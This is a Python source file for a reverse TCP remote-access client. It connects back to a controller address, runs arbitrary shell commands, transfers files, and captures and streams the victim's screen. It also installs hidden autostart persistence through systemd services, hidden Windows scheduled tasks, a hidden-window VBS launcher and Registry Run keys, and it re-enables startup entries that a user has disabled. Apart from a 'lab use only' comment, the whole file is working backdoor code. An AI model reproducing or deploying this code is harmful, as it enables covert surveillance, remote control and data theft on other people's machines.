# client.py - v10 (persistent + screenshare + screenshot + capture diagnostics)

import base64
import contextlib
import importlib.util
import io
import json
import os
import platform
import select
import shutil
import socket
import subprocess
import sys
import tempfile
import time

DEFAULT_IP = '192.168.0.113'
DEFAULT_PORT = 4444
RETRY_DELAY = 1               # seconds between reconnect attempts
MAX_FILE = 50 * 1024 * 1024   # 50 MB
SCREEN_SIZE = (960, 540)      # screen share frame size (width, height)
SCREEN_JPEG_QUALITY = 70      # JPEG quality for streamed frames
SCREENSHOT_JPEG_QUALITY = 85  # JPEG quality for one-shot screenshots
SCRIPT_PATH = os.path.abspath(__file__)                            # what autorun restarts
AUTORUN_NAME = os.path.splitext(os.path.basename(SCRIPT_PATH))[0]  # -> 'client'


def recv_exact(conn, n):
    chunks = []
    while n > 0:
        chunk = conn.recv(min(n, 65536))
        if not chunk:
            return None
        chunks.append(chunk)
        n -= len(chunk)
    return b''.join(chunks)


def send_msg(conn, obj):
    payload = json.dumps(obj).encode('utf-8')
    conn.sendall(len(payload).to_bytes(4, 'big') + payload)


def recv_msg(conn):
    try:
        header = recv_exact(conn, 4)
        if header is None:
            return None
        payload = recv_exact(conn, int.from_bytes(header, 'big'))
        if payload is None:
            return None
        return json.loads(payload.decode('utf-8'))
    except (OSError, ValueError):
        return None


def change_dir(command, current_dir):
    """Intercept a plain 'cd' so the directory persists between commands.
    Returns (new_dir, output_or_None), or None if it's not a plain cd."""
    cmd = command.strip()
    low = cmd.lower()
    if low != 'cd' and not low.startswith('cd '):
        return None
    if any(op in cmd for op in ('&&', '||', ';', '|')):
        return None  # compound command: let the shell run it

    target = cmd[2:].strip()
    if target.lower().startswith('/d '):        # Windows: cd /d C:\path
        target = target[3:].strip()
    if len(target) >= 2 and target[0] == target[-1] and target[0] in ('"', "'"):
        target = target[1:-1]

    if target == '':
        return current_dir, current_dir      # bare 'cd' prints the directory

    target = os.path.expanduser(target)
    new_dir = target if os.path.isabs(target) else os.path.join(current_dir, target)
    new_dir = os.path.normpath(new_dir)
    if os.path.isdir(new_dir):
        return new_dir, None
    return current_dir, "cd: cannot find the path: {}".format(target)


def ensure_dependencies():
    """Make sure Pillow (screen capture) is importable, installing it with
    pip when it is missing. Returns True if it is ready."""
    try:
        import PIL
    except ImportError:
        PIL = None

    if PIL is None:
        print("[+] Pillow (screen capture) is not installed - trying to install it automatically...")
        python = sys.executable or 'python'

        # Bootstrap pip when even that is missing (fresh Windows Python,
        # pure Arch without python-pip, ...)
        try:
            has_pip = subprocess.run([python, '-m', 'pip', '--version'],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
        except Exception:
            has_pip = False
        if not has_pip:
            print("[+] pip is missing too - trying to bootstrap it with ensurepip...")
            for bootstrap in ([python, '-m', 'ensurepip', '--upgrade'],
                              [python, '-m', 'ensurepip', '--upgrade', '--user']):
                try:
                    if subprocess.run(bootstrap, stdout=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL, timeout=300).returncode == 0:
                        break
                except Exception:
                    pass

        # Try every way a machine may accept a pip install:
        #  - normal venv/Windows install
        #  - user site (works without root)
        #  - Arch blocks system pip with "externally-managed-environment",
        #    so also try the PEP 668 escape hatch, with and without --user
        attempts = [
            [python, '-m', 'pip', 'install', 'pillow'],
            [python, '-m', 'pip', 'install', '--user', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', '--user', 'pillow'],
        ]
        for cmd in attempts:
            try:
                print("[+] Running: {}".format(' '.join(cmd)))
                if subprocess.run(cmd, timeout=600).returncode == 0:
                    break
            except Exception as e:
                print("[!] Installer failed: {}".format(e))
        else:
            # Last resort on Arch: the system package manager (needs root)
            if hasattr(os, 'geteuid') and os.geteuid() == 0 and shutil.which('pacman'):
                try:
                    print("[+] Running: pacman -S --noconfirm --needed python-pillow grim")
                    subprocess.run(['pacman', '-S', '--noconfirm', '--needed', 'python-pillow', 'grim'], timeout=600)
                except Exception as e:
                    print("[!] pacman failed: {}".format(e))

        try:
            import PIL
        except ImportError:
            print("[!] Could not install Pillow automatically. Install it by hand:")
            print("    Windows:     py -m pip install pillow")
            print("    Arch Linux:  sudo pacman -S python-pillow grim")
            return False

    if sys.platform.startswith('linux') and os.environ.get('WAYLAND_DISPLAY'):
        desktop = os.environ.get('XDG_CURRENT_DESKTOP', 'unknown').split(':')[0]
        available = [t for t in ('grim', 'spectacle') if shutil.which(t)]
        print("[+] Wayland session ({}): capture helpers found: {}.".format(
            desktop, ', '.join(available) if available else 'none'))

    print("[+] Screen capture ready (Pillow {}).".format(PIL.__version__))
    return True


class CaptureError(RuntimeError):
    """Screen capture failed - carries the per-backend details so the
    controller can show what was tried and how to fix it."""

    def __init__(self, message, attempts):
        super().__init__(message)
        self.attempts = attempts


def distro_info():
    """(distro id, pretty name), from /etc/os-release where available."""
    if not sys.platform.startswith('linux'):
        return (platform.system().lower() or 'unknown',
                '{} {}'.format(platform.system(), platform.release()))
    try:
        with open('/etc/os-release') as f:
            info = dict(line.strip().split('=', 1) for line in f if '=' in line)
        distro_id = info.get('ID', 'linux').strip('"').lower()
        name = info.get('PRETTY_NAME', info.get('NAME', 'Linux')).strip('"')
        return distro_id, name
    except Exception:
        return 'linux', 'Linux'


def environment_report():
    """What this machine has for screen capture. Sent to the controller on
    connect (and with capture errors) so it can explain anything missing."""
    distro_id, distro_name = distro_info()
    if sys.platform.startswith('linux'):
        session = ('wayland' if os.environ.get('WAYLAND_DISPLAY') else
                   'x11' if os.environ.get('DISPLAY') else 'none')
        desktop = os.environ.get('XDG_CURRENT_DESKTOP') or 'unknown'
    else:
        session = 'desktop'
        desktop = platform.system()
    try:
        import PIL
        pillow = getattr(PIL, '__version__', 'present')
    except ImportError:
        pillow = None
    try:
        has_pyautogui = importlib.util.find_spec('pyautogui') is not None
    except Exception:
        has_pyautogui = False
    helpers = {
        'pillow': pillow,
        'pyautogui': has_pyautogui,
        'grim': shutil.which('grim') is not None,
        'spectacle': shutil.which('spectacle') is not None,
        'gnome_screenshot': shutil.which('gnome-screenshot') is not None,
        'gnome_dbus': shutil.which('gdbus') is not None,
        'imagemagick': bool(shutil.which('import') or shutil.which('magick')),
    }
    if sys.platform.startswith('win'):
        os_name = 'windows'
    elif sys.platform.startswith('linux'):
        os_name = 'linux'
    else:
        os_name = platform.system().lower()
    return {
        'os': os_name,
        'distro': distro_id,
        'distro_name': distro_name,
        'session': session,
        'desktop': desktop,
        'python': '{}.{}.{}'.format(*sys.version_info[:3]),
        'helpers': helpers,
    }


def _capture_diag(exc):
    """Structured details about a capture failure, for the controller."""
    env = environment_report()
    helpers = env['helpers']
    if env['session'] == 'none':
        category = 'no_session'
    elif not any(helpers.get(k) for k in
                 ('pillow', 'pyautogui', 'grim', 'spectacle', 'gnome_screenshot',
                  'gnome_dbus', 'imagemagick')):
        category = 'missing_deps'
    else:
        category = 'all_failed'
    return {
        'kind': 'capture',
        'category': category,
        'attempts': list(getattr(exc, 'attempts', [])) or [str(exc)],
        'env': env,
    }


def grab_screen():
    """Take one screenshot from wherever this client runs.

    Order matters: on a Wayland session the desktop's own tool is used first
    (spectacle for KDE, gnome-shell for GNOME, grim on Hyprland/Sway),
    because Pillow's X11 path can "succeed" with an empty XWayland picture.
    On X11, Windows and macOS, Pillow's ImageGrab comes first as before."""
    try:
        import PIL  # noqa: F401
    except ImportError:
        ensure_dependencies()

    def from_stdout(cmd):
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=20)
        if proc.returncode != 0 or not proc.stdout:
            raise RuntimeError('exit status {}'.format(proc.returncode))
        from PIL import Image
        return Image.open(io.BytesIO(proc.stdout)).convert('RGB')

    def from_file(cmd):
        from PIL import Image
        tmp = os.path.join(tempfile.gettempdir(), 'client_shot_{}.png'.format(os.getpid()))
        try:
            proc = subprocess.run(cmd + [tmp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
            if proc.returncode != 0 or not os.path.exists(tmp):
                raise RuntimeError('exit status {}'.format(proc.returncode))
            with open(tmp, 'rb') as f:
                return Image.open(io.BytesIO(f.read())).convert('RGB')
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    wayland = sys.platform.startswith('linux') and (
        os.environ.get('XDG_SESSION_TYPE', '').lower() == 'wayland'
        or bool(os.environ.get('WAYLAND_DISPLAY')))
    desktop = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()

    empty_xwayland = []          # a solid-colour XWayland picture, kept as last resort

    def pillow_imagegrab():
        from PIL import ImageGrab
        img = ImageGrab.grab().convert('RGB')
        if wayland:
            lo, hi = img.convert('L').getextrema()
            if lo == hi:             # XWayland root can be a flat black/blank picture
                empty_xwayland.append(img)
                raise RuntimeError('empty XWayland picture (solid colour)')
        return img

    def pyautogui_grab():
        import pyautogui        # NOTE: may sys.exit() on Linux without tkinter
        return pyautogui.screenshot().convert('RGB')

    helpers = {
        'grim': (['grim', '-t', 'jpeg', '-'], from_stdout),        # wlroots Wayland (Hyprland/Sway)
        'spectacle': (['spectacle', '-b', '-n', '-f', '-o'], from_file),  # KDE Plasma (X11 or Wayland)
        'gnome': (['gdbus', 'call', '--session', '--dest', 'org.gnome.Shell.Screenshot',
                   '--object-path', '/org/gnome/Shell/Screenshot', '--method',
                   'org.gnome.Shell.Screenshot.Screenshot', 'true', 'false'], from_file),  # GNOME Wayland
        'magick': (['import', '-window', 'root', 'png:-'], from_stdout),  # ImageMagick on X11
    }
    plain_order = ['grim', 'spectacle', 'gnome', 'magick']

    if wayland:
        if 'kde' in desktop:
            order = ['spectacle'] + [h for h in plain_order if h != 'spectacle']
        elif 'gnome' in desktop:
            order = ['gnome'] + [h for h in plain_order if h != 'gnome']
        else:
            order = plain_order         # Hyprland/Sway/... : grim is the right tool
        attempts = [(name, (lambda name=name: helpers[name][1](helpers[name][0]))) for name in order]
        attempts.append(('Pillow', pillow_imagegrab))
    else:
        attempts = [('Pillow', pillow_imagegrab), ('pyautogui', pyautogui_grab)]
        attempts += [(name, (lambda name=name: helpers[name][1](helpers[name][0]))) for name in plain_order]

    errors = []
    for name, take in attempts:
        try:
            return take()
        except BaseException as e:
            if isinstance(e, FileNotFoundError):
                detail = 'not installed (not found in PATH)'
            else:
                detail = str(e)
            errors.append('{}: {}'.format(name, detail))

    if empty_xwayland:
        return empty_xwayland[0]      # nothing better worked - send what we have

    raise CaptureError(
        'no screen capture available ({}). On Windows: py -m pip install pillow; '
        'on Arch Linux: sudo pacman -S python-pillow grim'.format(' | '.join(errors)),
        errors)


def stream_screen(conn, fps=None):
    """Capture this machine's screen and stream it to the controller as
    JPEG frames. Runs until the controller asks to stop or the connection
    breaks (OSError -> the main loop reconnects)."""
    interval = None
    if fps:
        try:
            interval = 1.0 / max(1, min(int(fps), 60))
        except (TypeError, ValueError):
            interval = None

    while True:
        # Between frames: did the controller ask us to stop?
        readable, _, _ = select.select([conn], [], [], 0)
        if readable:
            msg = recv_msg(conn)
            if msg is None:
                raise OSError('controller closed the connection')
            if msg.get('type') == 'screenshare_stop':
                send_msg(conn, {'type': 'output', 'data': '[client] screen share stopped'})
                return

        start = time.time()
        try:
            img = grab_screen()
            img = img.resize(SCREEN_SIZE)                 # PIL resize: (width, height)
            buf = io.BytesIO()
            img.save(buf, 'JPEG', quality=SCREEN_JPEG_QUALITY)
        except Exception as e:
            send_msg(conn, {'type': 'error',
                            'data': 'screenshot failed: {}'.format(e),
                            'diag': _capture_diag(e)})
            return

        payload = b'\x01' + buf.getvalue()                # b'\x01' = "this is a JPEG frame"
        conn.sendall(len(payload).to_bytes(4, 'big') + payload)

        if interval:
            elapsed = time.time() - start
            if elapsed < interval:
                time.sleep(interval - elapsed)


def take_screenshot(conn):
    """Send one full-resolution screenshot as a JPEG image."""
    try:
        img = grab_screen()
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=SCREENSHOT_JPEG_QUALITY)
    except Exception as e:
        send_msg(conn, {'type': 'error',
                        'data': 'screenshot failed: {}'.format(e),
                        'diag': _capture_diag(e)})
        return
    send_msg(conn, {'type': 'image', 'name': 'screenshot.jpg',
                    'data': base64.b64encode(buf.getvalue()).decode('ascii')})


# ---------------------------------------------------------------------------
# Auto-start ("persistence"): the client can install itself so it starts
# quietly after a reboot/logon. Based on autorunner.py - lab use only.
# ---------------------------------------------------------------------------

def get_os_info():
    os_type = platform.system().lower()
    if os_type == 'linux':
        try:
            with open('/etc/os-release') as f:
                info = dict(line.strip().split('=', 1) for line in f if '=' in line)
            return 'Linux ({})'.format(info.get('NAME', 'Generic Linux').strip('"'))
        except OSError:
            return 'Linux (Unknown Distro)'
    if os_type == 'windows':
        return 'Windows {}'.format(platform.release())
    return platform.system()


def is_omarchy():
    if platform.system().lower() != 'linux':
        return False
    try:
        with open('/etc/os-release') as f:
            return 'omarchy' in f.read().lower()
    except OSError:
        return False


def _user_manager_running():
    try:
        return os.path.isdir('/run/user/{}/systemd'.format(os.getuid()))
    except AttributeError:
        return False


def run_quiet(cmd):
    """Run a setup command; True when it succeeded."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True).returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def _service_body(exec_cmd, silent, log_file, after, wanted, user_line):
    if log_file:
        out = 'append:{}'.format(os.path.abspath(log_file))
    elif silent:
        out = 'null'
    else:
        out = 'journal'
    after_line = '' if after is None else 'After={}\n'.format(after)
    return (
        "[Unit]\n"
        "Description=Auto-run for {}\n"
        "{}"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "{}ExecStart={}\n"
        "WorkingDirectory={}\n"
        "Restart=on-failure\n"
        "RestartSec=3\n"
        "StandardInput=null\n"
        "StandardOutput={}\n"
        "StandardError={}\n"
        "\n"
        "[Install]\n"
        "WantedBy={}\n"
    ).format(AUTORUN_NAME, after_line, user_line, exec_cmd,
             os.path.dirname(SCRIPT_PATH), out, out, wanted)


def setup_linux(ip, port, silent, log_file):
    if not shutil.which('systemctl'):
        print('[-] systemd is not available on this system.')
        return False

    python = sys.executable or shutil.which('python3') or 'python3'
    exec_cmd = '{} {} {} {}'.format(python, SCRIPT_PATH, ip, port)
    service_name = 'autorun-{}.service'.format(AUTORUN_NAME)

    # Prefer a user service: it starts with the desktop session, so screen
    # capture works after a reboot too. (autorunner.py's Omarchy behaviour,
    # extended to any distro with a running systemd user manager.)
    if is_omarchy() or _user_manager_running():
        svc_dir = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(svc_dir, exist_ok=True)
        if is_omarchy() or run_quiet(['systemctl', '--user', 'is-active', '--quiet',
                                      'graphical-session.target']):
            after = wanted = 'graphical-session.target'
        else:
            # no graphical-session.target on this desktop -> plain login start
            after, wanted = None, 'default.target'
        svc_path = os.path.join(svc_dir, service_name)
        try:
            with open(svc_path, 'w') as f:
                f.write(_service_body(exec_cmd, silent, log_file, after, wanted, ''))
        except OSError as e:
            print('[-] Cannot write service: {}'.format(e))
            return False
        run_quiet(['systemctl', '--user', 'daemon-reload'])
        if not run_quiet(['systemctl', '--user', 'enable', '--now', service_name]):
            print('[-] systemctl --user enable failed.')
            return False
        print('[+] User service: {}'.format(svc_path))
        print('[+] Starts with your session after reboot, no terminal window.')
        return True

    # No user manager (SSH-only / server style box): system service, needs root
    if os.geteuid() != 0:
        print('[-] Need root for a system service: re-run with sudo.')
        return False
    run_user = os.environ.get('SUDO_USER', 'root')
    user_line = '' if run_user == 'root' else 'User={}\n'.format(run_user)
    svc_path = '/etc/systemd/system/{}'.format(service_name)
    try:
        with open(svc_path, 'w') as f:
            f.write(_service_body(exec_cmd, silent, log_file,
                                  'network.target', 'multi-user.target', user_line))
    except OSError as e:
        print('[-] Cannot write service: {}'.format(e))
        return False
    run_quiet(['systemctl', 'daemon-reload'])
    if not run_quiet(['systemctl', 'enable', '--now', service_name]):
        print('[-] systemctl enable failed.')
        return False
    print('[+] System service: {}'.format(svc_path))
    print('[+] Runs at boot with no terminal window.')
    return True


def _pythonw_path():
    """Locate pythonw.exe (the GUI-subsystem interpreter = no console window)."""
    exe = sys.executable or ''
    if exe:
        d = os.path.dirname(exe)
        for name in ('pythonw.exe', 'pythonw'):
            cand = os.path.join(d, name)
            if os.path.exists(cand):
                return cand
    for name in ('pythonw.exe', 'pythonw'):
        p = shutil.which(name)
        if p:
            return p
    return None


def _make_vbs(executable, arg_path, extra_args):
    """VBS launcher that starts a process with a hidden window."""
    base = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(), 'AutoRunner')
    os.makedirs(base, exist_ok=True)
    vbs_path = os.path.join(base, 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
    inner = '"{}" "{}"'.format(executable, arg_path)
    if extra_args:
        inner += ' ' + extra_args
    escaped = inner.replace('"', '""')
    content = ('Set WshShell = CreateObject("WScript.Shell")\r\n'
               'WshShell.Run "{}", 0, False\r\n').format(escaped)
    with open(vbs_path, 'w', encoding='utf-8') as f:
        f.write(content)
    return vbs_path


def _windows_command(ip, port, silent):
    """Return (execute, arguments) for the Windows launcher."""
    args = '{} {}'.format(ip, port)
    if silent:
        pyw = _pythonw_path()
        if pyw:
            return pyw, '"{}" {}'.format(SCRIPT_PATH, args)
        py = sys.executable or shutil.which('python') or 'python'
        vbs = _make_vbs(py, SCRIPT_PATH, args)
        return 'wscript.exe', '"{}"'.format(vbs)
    py = sys.executable or shutil.which('python') or 'python'
    return py, '"{}" {}'.format(SCRIPT_PATH, args)


def _register_task_powershell(task_name, execute, arguments):
    ps = '\n'.join([
        "$ErrorActionPreference = 'Stop'",
        "$exe = '{}'".format(execute.replace("'", "''")),
        "$arg = '{}'".format(arguments.replace("'", "''")),
        ("$action = New-ScheduledTaskAction -Execute $exe -Argument $arg" if arguments
         else "$action = New-ScheduledTaskAction -Execute $exe"),
        "$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME",
        "$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries "
        "-DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)",
        "$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME "
        "-LogonType Interactive -RunLevel Limited",
        "Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger "
        "-Settings $settings -Principal $principal -Force | Out-Null".format(task_name),
    ])
    fd, path = tempfile.mkstemp(suffix='.ps1', text=True)
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            f.write(ps)
        return run_quiet(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', path])
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def _register_task_schtasks(task_name, execute, arguments):
    tr = '"{}" {}'.format(execute, arguments).strip()
    return run_quiet(['schtasks', '/Create', '/TN', task_name, '/TR', tr,
                      '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'])


def _windows_registry_fallback(task_name, execute, arguments):
    try:
        import winreg
    except ImportError:
        print('[-] winreg unavailable.')
        return False
    cmd = '"{}" {}'.format(execute, arguments) if arguments else '"{}"'.format(execute)
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    approved_key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, task_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
        try:                              # clear a "disabled" flag Task Manager may have set
            ka = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(ka, task_name, 0, winreg.REG_BINARY,
                              bytes([0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]))
            winreg.CloseKey(ka)
        except FileNotFoundError:
            pass
        print('[+] Registry entry: HKCU\\{}\\{}'.format(run_key, task_name))
        return True
    except OSError as e:
        print('[-] Registry error: {}'.format(e))
        return False


def setup_windows(ip, port, silent):
    task_name = 'AutoRun_{}'.format(AUTORUN_NAME)
    execute, arguments = _windows_command(ip, port, silent)

    if _register_task_powershell(task_name, execute, arguments):
        print("[+] Scheduled Task '{}' created (hidden, at logon).".format(task_name))
    elif _register_task_schtasks(task_name, execute, arguments):
        print("[+] Scheduled Task '{}' created via schtasks.".format(task_name))
    else:
        print('[!] schtasks failed; falling back to the registry...')
        if not _windows_registry_fallback(task_name, execute, arguments):
            return False

    run_quiet(['schtasks', '/Run', '/TN', task_name])
    return True


def install_autostart(ip, port, silent=True, log_file=None):
    """Set this client up to start automatically after reboot/logon.
    Returns the setup log as text (also used as the reply to the controller)."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        print('[*] OS: {}'.format(get_os_info()))
        print('[*] Mode: {}'.format('silent (no window)' if silent else 'visible'))
        print('[*] Program: {} {} {}'.format(SCRIPT_PATH, ip, port))
        os_type = platform.system().lower()
        try:
            if os_type == 'linux':
                ok = setup_linux(ip, port, silent, log_file)
            elif os_type == 'windows':
                ok = setup_windows(ip, port, silent)
            else:
                print('[-] Unsupported OS: {}'.format(platform.system()))
                ok = False
        except Exception as e:
            print('[-] Unexpected error: {}'.format(e))
            ok = False
        if ok:
            print('[+] Done. The client will start automatically after reboot/logon.')
            print('    Nothing will appear on screen - you can close the terminal window.')
    return buf.getvalue().strip()


def remove_autostart():
    """Remove the auto-start entry. Returns the log as text."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        os_type = platform.system().lower()
        service_name = 'autorun-{}.service'.format(AUTORUN_NAME)
        task_name = 'AutoRun_{}'.format(AUTORUN_NAME)

        if os_type == 'linux':
            removed = False
            user_path = os.path.expanduser('~/.config/systemd/user/{}'.format(service_name))
            if os.path.exists(user_path):
                run_quiet(['systemctl', '--user', 'disable', service_name])
                try:
                    os.remove(user_path)
                    removed = True
                except OSError as e:
                    print('[-] Could not remove {}: {}'.format(user_path, e))
                run_quiet(['systemctl', '--user', 'daemon-reload'])
            system_path = '/etc/systemd/system/{}'.format(service_name)
            if os.path.exists(system_path):
                if os.geteuid() == 0:
                    run_quiet(['systemctl', 'disable', service_name])
                    try:
                        os.remove(system_path)
                        removed = True
                    except OSError as e:
                        print('[-] Could not remove {}: {}'.format(system_path, e))
                    run_quiet(['systemctl', 'daemon-reload'])
                else:
                    print('[-] A system service exists - remove it with sudo.')
            print('[+] Autostart removed.' if removed else '[-] No autostart entry found.')
            print('[+] A running client stays up until closed or rebooted.')

        elif os_type == 'windows':
            run_quiet(['schtasks', '/Delete', '/TN', task_name, '/F'])
            try:
                import winreg
                for path in (r'Software\Microsoft\Windows\CurrentVersion\Run',
                             r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'):
                    try:
                        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
                        try:
                            winreg.DeleteValue(k, task_name)
                        except FileNotFoundError:
                            pass
                        winreg.CloseKey(k)
                    except FileNotFoundError:
                        pass
            except ImportError:
                pass
            vbs = os.path.join(os.environ.get('LOCALAPPDATA') or tempfile.gettempdir(),
                               'AutoRunner', 'AutoRun_{}.vbs'.format(AUTORUN_NAME))
            try:
                os.remove(vbs)
            except OSError:
                pass
            print('[+] Windows autostart removed.')
            print('[+] A running client stays up until closed or rebooted.')

        else:
            print('[-] Unsupported OS: {}'.format(os_type))
    return buf.getvalue().strip()


def parse_args(argv):
    """client.py [controller_ip] [controller_port]
                [--persist | --remove-persist] [--visible] [--log-file PATH]"""
    ip = DEFAULT_IP
    port = DEFAULT_PORT
    persist = remove = visible = False
    log_file = None
    positional = []
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == '--persist':
            persist = True
        elif a in ('--remove-persist', '--remove'):
            remove = True
        elif a == '--visible':
            visible = True
        elif a == '--log-file' and i + 1 < len(argv):
            i += 1
            log_file = argv[i]
        else:
            positional.append(a)
        i += 1
    if positional:
        ip = positional[0]
    if len(positional) > 1:
        try:
            port = int(positional[1])
        except ValueError:
            pass
    return ip, port, persist, remove, visible, log_file


def main():
    if any(a in ('-h', '--help') for a in sys.argv[1:]):
        print('usage: python client.py [controller_ip] [controller_port]')
        print('       --persist          install auto-start (silent) for this client')
        print('       --visible          with --persist: show a window instead')
        print('       --log-file PATH    with --persist (Linux): keep a log file')
        print('       --remove-persist   remove the auto-start entry')
        return

    target_ip, target_port, do_persist, do_remove, visible, log_file = parse_args(sys.argv[1:])

    print("[+] Reverse TCP screen-share client v10")

    if do_remove:
        print(remove_autostart())
        return

    if do_persist:
        print(install_autostart(target_ip, target_port, silent=not visible, log_file=log_file))
        return

    ensure_dependencies()

    # Persistent working directory: survives reconnects
    current_dir = os.getcwd()

    # Outer loop: runs until you close this program or the controller says exit
    while True:
        # Keep trying until the controller is up, so the start order doesn't matter
        while True:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_ip, target_port))
                break
            except OSError as e:
                print("[!] Controller not reachable at {}:{} ({}), retrying in {}s...".format(target_ip, target_port, e, RETRY_DELAY))
                time.sleep(RETRY_DELAY)

        print("[+] Reverse TCP shell connected to {}:{}".format(target_ip, target_port))

        # Tell the controller what this machine has (OS, session, capture tools)
        # so it can explain any missing dependency with exact install commands.
        try:
            send_msg(client_socket, {'type': 'hello', 'env': environment_report()})
        except OSError:
            pass

        # Serve commands until the controller goes away (then reconnect and wait)
        stop = False
        try:
            while True:
                msg = recv_msg(client_socket)
                if msg is None:              # controller closed the connection
                    print("[!] Controller closed the connection. Reconnecting...")
                    break

                mtype = msg.get('type')

                if mtype == 'exit':
                    try:
                        send_msg(client_socket, {'type': 'output', 'data': '[client] shutting down'})
                    except OSError:
                        pass
                    stop = True
                    break

                if mtype == 'cmd':
                    command = msg.get('data', '')
                    if not command.strip():
                        continue

                    cd_result = change_dir(command, current_dir)
                    if cd_result is not None:
                        current_dir, output = cd_result
                        send_msg(client_socket, {'type': 'output', 'data': output if output is not None else '[no output]'})
                        continue

                    try:
                        process = subprocess.Popen(command, shell=True, cwd=current_dir,
                                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        output, _ = process.communicate()
                        text = output.decode('utf-8', errors='replace')
                        if not text:
                            text = '[no output]'
                        send_msg(client_socket, {'type': 'output', 'data': text})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'data': '{}'.format(e)})
                    continue

                if mtype == 'download':
                    path = os.path.expanduser(msg.get('path', ''))
                    real_path = path if os.path.isabs(path) else os.path.join(current_dir, path)
                    try:
                        if os.path.getsize(real_path) > MAX_FILE:
                            send_msg(client_socket, {'type': 'error', 'data': 'File too large (max {} MB)'.format(MAX_FILE // (1024 * 1024))})
                            continue
                        with open(real_path, 'rb') as f:
                            data = base64.b64encode(f.read()).decode('ascii')
                        send_msg(client_socket, {'type': 'file', 'name': os.path.basename(real_path), 'data': data})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'data': 'download failed: {}'.format(e)})
                    continue

                if mtype == 'upload':
                    name = os.path.expanduser(msg.get('name', 'uploaded.bin'))
                    dest = name if os.path.isabs(name) else os.path.join(current_dir, name)
                    try:
                        data = base64.b64decode(msg.get('data', ''))
                        with open(dest, 'wb') as f:
                            f.write(data)
                        send_msg(client_socket, {'type': 'output', 'data': 'Saved to {} ({} bytes)'.format(dest, len(data))})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'data': 'upload failed: {}'.format(e)})
                    continue

                if mtype == 'screenshot':
                    take_screenshot(client_socket)
                    continue

                if mtype == 'persist':
                    try:
                        report = install_autostart(target_ip, target_port)
                    except Exception as e:
                        report = 'persist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'data': report})
                    continue

                if mtype == 'unpersist':
                    try:
                        report = remove_autostart()
                    except Exception as e:
                        report = 'unpersist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'data': report})
                    continue

                if mtype == 'screenshare':
                    stream_screen(client_socket, msg.get('fps'))
                    continue

                send_msg(client_socket, {'type': 'error', 'data': 'unknown message type: {}'.format(mtype)})
        except OSError as e:
            print("[!] Connection error: {}. Reconnecting...".format(e))

        try:
            client_socket.close()
        except OSError:
            pass

        if stop:
            print("[+] Controller requested shutdown. Exiting.")
            break
        # otherwise: loop back and try to reconnect


if __name__ == "__main__":
    main()
